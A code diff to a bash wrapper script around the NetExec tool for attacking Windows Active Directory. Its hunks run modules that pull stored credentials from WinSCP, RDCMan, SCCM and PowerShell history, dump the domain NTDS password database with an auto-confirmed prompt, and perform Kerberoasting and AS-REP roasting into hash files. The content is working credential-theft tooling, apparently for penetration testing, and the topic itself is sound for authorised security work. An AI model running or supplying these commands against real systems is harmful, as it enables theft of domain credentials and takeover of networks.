@@ -129,7 +129,11 @@ case "$MODE" in
     run_nxc nxc smb "$TARGET" $AUTH_ARGS -M winscp
     run_nxc nxc smb "$TARGET" $AUTH_ARGS -M rdcman
     run_nxc nxc smb "$TARGET" $AUTH_ARGS --sccm
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS -M powershell_history
+
+    # Not including PS-history in logfile not to ruin the creds file
+    log "Running: nxc smb $TARGET $AUTH_ARGS -M powershell_history"
+    unbuffer nxc smb $TARGET $AUTH_ARGS -M powershell_history
+
     log "Running: nxc smb $TARGET $AUTH_ARGS --ntds"
     script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds"
 
@@ -159,8 +163,8 @@ case "$MODE" in
 
   roast)
     log "Starting kerberoast & asreproast…"
-    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kerberoasting "$OUTDIR/kerberoast.hash"
-    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --asreproast "$OUTDIR/asrep.hash"
+    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting "$OUTDIR/kerberoast.hash"
+    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast "$OUTDIR/asrep.hash"
     echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
     echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
     ;;
